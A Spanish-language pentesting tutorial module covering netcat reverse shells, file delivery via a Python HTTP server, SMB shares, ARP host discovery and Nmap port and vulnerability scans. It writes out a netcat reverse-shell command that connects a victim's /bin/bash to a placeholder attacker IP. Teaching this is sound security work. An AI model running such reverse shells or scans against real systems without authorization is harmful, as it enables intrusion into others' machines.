
# 🧠 Conceptos Básicos de Hacking

Este módulo introduce las herramientas y técnicas fundamentales utilizadas en la etapa de **reconocimiento y explotación básica** dentro de un proceso de pentesting. Todo lo que aprendas aquí será clave en casi cualquier entorno real.

---

## 🧪 Uso de Netcat para entablar Reverse Shell

**Netcat** (o `nc`) es una herramienta versátil para transferir datos a través de redes. Se puede usar para chats, escaneo de puertos, transferencias de archivos y establecer **conexiones reversas** (reverse shell).

### ❓ ¿Qué es una Reverse Shell?
Una reverse shell permite que una máquina víctima se conecte de vuelta al atacante, y le otorgue acceso remoto a través de una consola.

### 🧰 Comando típico:

**En el atacante (Kali):**
```bash
nc -lvnp 4444
```

**En la víctima:**
```bash
nc <IP_DEL_ATACANTE> 4444 -e /bin/bash
```

> 💡 En Windows usar: `-e cmd.exe` (aunque algunos antivirus lo bloquean).

---

## 🌐 Cómo Compartir Archivos con Servidor HTTP (Python) + Reverse Shell

A veces necesitas que la víctima descargue un archivo. Con Python puedes montar un servidor web al instante:

### 🚀 Comando:
```bash
# En el atacante (Kali):
python3 -m http.server 8080
```

Ahora puedes compartir archivos y scripts para que la víctima los descargue accediendo a `http://IP_DEL_ATACANTE:8080`.

---

## 🪟 Compartir Archivos por la Red en Máquinas Windows

Windows permite compartir carpetas por red (usando SMB). Puedes acceder desde Kali usando:

```bash
smbclient //IP_DEL_HOST/SHARE -U usuario
```

O montarlo directamente:

```bash
sudo mount -t cifs //IP_DEL_HOST/SHARE /mnt/smb -o username=usuario,password=contraseña
```

> ✅ Útil para transferir herramientas post-explotación como netcat o scripts de PowerShell.

---

## 🔎 Reconocimiento de la red con ARP-SCAN o NETDISCOVER

Antes de atacar, debes saber qué hosts están en tu red local.

### 🔍 Con `arp-scan`:
```bash
sudo arp-scan --interface=eth0 --localnet
```

### 🔍 Con `netdiscover`:
```bash
sudo netdiscover -i eth0 -r 192.168.1.0/24
```

> Útil para identificar direcciones IP y MAC de los dispositivos en la red.

---

## 🔍 Escaneos Básicos con Nmap

**Nmap** es la herramienta más usada en pentesting para reconocer servicios y puertos.

### 🔹 Escaneo rápido:
```bash
nmap -T4 -F 192.168.1.10
```

### 🔹 Escaneo más completo:
```bash
nmap -sS -sV -O -Pn 192.168.1.10
```

---

## 🧨 Detectar Vulnerabilidades con Nmap

Con `--script vuln` puedes correr una serie de scripts NSE que detectan fallos comunes:

```bash
nmap --script vuln 192.168.1.10
```

Esto te mostrará posibles vulnerabilidades como SMBv1 habilitado, HTTP mal configurado, etc.

---

## 📡 Escaneo de Puertos bajo el Protocolo UDP

Algunos servicios importantes (como DNS, SNMP) usan UDP. Para escanear:

```bash
sudo nmap -sU -T4 192.168.1.10
```

> Combinación recomendada:
```bash
sudo nmap -sS -sU -T4 -Pn 192.168.1.10
```

---

## 💬 Recomendaciones generales

- Guarda todo lo que descubras en archivos `.md` o `.txt`.
- No subestimes el reconocimiento. Es la clave para un ataque efectivo.
- Practica los comandos manualmente para entender qué hace cada parámetro.
- Usa entornos seguros para probar cada herramienta.

---

## 📚 Recursos útiles

- https://nmap.org/book/man.html
- https://nmap.org/nsedoc/
- man nmap, man netcat, man arp-scan

---

💡 “El reconocimiento es el 90% del éxito. Si conoces tu entorno, ya ganaste medio ataque.”
